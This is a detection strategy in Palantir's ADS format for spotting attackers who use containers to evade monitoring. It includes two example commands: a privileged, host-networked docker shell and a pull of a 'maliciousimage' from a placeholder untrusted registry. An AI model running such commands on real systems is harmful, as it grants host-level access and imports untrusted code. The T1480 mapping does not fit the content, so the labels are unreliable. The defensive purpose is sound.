# Palantir's Alerting & Detection Strategy (ADS) Framework

## Goal
The objective of this technique is to detect adversarial attempts to bypass security monitoring using containers. By identifying such activities, organizations can mitigate potential threats before they compromise critical systems.

## Categorization
- **MITRE ATT&CK Mapping:** T1480 - Execution Guardrails
- **Tactic / Kill Chain Phases:** Defense Evasion
- **Platforms:** Linux, macOS, Windows

[MITRE ATT&CK Reference](https://attack.mitre.org/techniques/T1480)

## Strategy Abstract
The detection strategy focuses on monitoring for unusual container activity indicative of adversarial behavior. This involves analyzing data from several sources including:
- Container orchestration logs (e.g., Kubernetes audit logs)
- Host system activity logs
- Network traffic related to container communication

Patterns analyzed include abnormal resource usage, unexpected container creation or deletion, and atypical network connections emanating from containers.

## Technical Context
Adversaries use containers to evade detection by encapsulating their malicious activities within isolated environments. This technique can involve:
- Running unauthorized applications inside containers
- Modifying container images to include malware
- Exploiting vulnerabilities in container runtimes

**Example Commands:**
```bash
# Example of creating a suspicious container with elevated privileges
docker run --rm -it --privileged --net=host ubuntu /bin/bash

# Example of pulling a potentially malicious image from an untrusted registry
docker pull someuntrustedservice.com/maliciousimage:latest
```

**Test Scenario:**
- Deploy a known benign application within a container.
- Introduce anomalies such as elevated network activity or unauthorized resource usage.

## Blind Spots and Assumptions
- **Blind Spot:** Legitimate use cases involving frequent container creation/deletion may not be fully distinguishable from malicious activities.
- **Assumption:** The baseline of normal behavior for containerized applications is well-established and monitored.

## False Positives
Potential benign activities that could trigger false alerts include:
- Development environments where rapid container deployment is common.
- Legitimate use of containers for testing purposes leading to high churn rates.
- Scheduled tasks causing temporary spikes in resource usage within containers.

## Priority
**Severity: High**

Justification: Container-based evasion techniques can significantly undermine security monitoring efforts, allowing adversaries to operate undetected and potentially compromise sensitive data or infrastructure.

## Validation (Adversary Emulation)
Step-by-step instructions to emulate this technique are not available at this time. Developing a controlled environment for testing is recommended to better understand potential detection gaps.

## Response
When an alert fires:
1. **Immediate Isolation:** Quarantine the affected container to prevent further activity.
2. **Log Analysis:** Examine container logs and host system logs for unusual activities or commands executed within the container.
3. **Network Traffic Inspection:** Analyze network traffic associated with the suspicious container for any outbound connections to known malicious domains.
4. **Image Verification:** Verify the integrity of images used by containers against a trusted repository.
5. **Forensic Investigation:** Conduct a detailed forensic analysis to understand the scope and impact of the detected activity.

## Additional Resources
Additional references and context are not available at this time. Organizations should consider consulting with container security experts or utilizing third-party tools specializing in container monitoring for enhanced detection capabilities.